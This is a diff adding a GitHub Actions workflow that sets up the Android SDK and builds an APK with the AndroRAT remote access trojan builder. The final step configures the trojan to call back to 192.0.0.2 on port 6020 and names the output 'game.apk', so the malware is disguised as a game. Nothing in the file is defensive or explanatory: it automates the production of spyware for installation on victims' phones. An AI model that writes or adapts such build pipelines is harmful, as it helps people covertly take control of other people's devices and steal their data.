@@ -1,0 +1,30 @@
+name: Build AndroRAT APK
+
+on: [push]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Checkout
+      uses: actions/checkout@v2
+
+    - name: Set up JDK
+      uses: actions/setup-java@v1
+      with:
+        java-version: 11
+
+    - name: Install SDK
+      run: |
+        sudo apt-get update
+        sudo apt-get install -y wget unzip
+        wget "https://dl.google.com/android/repository/commandlinetools-linux-7583922_latest.zip" -O cmdline-tools.zip
+        unzip cmdline-tools.zip -d $HOME/android-sdk
+        export ANDROID_HOME=$HOME/android-sdk
+        $HOME/android-sdk/cmdline-tools/bin/sdkmanager --sdk_root=$HOME/android-sdk "platform-tools" "platforms;android-30" "build-tools;30.0.3"
+
+    - name: Build APK
+      run: |
+        cd AndroRAT
+        python3 androRAT.py --build -i 192.0.0.2 -p 6020 -o game.apk
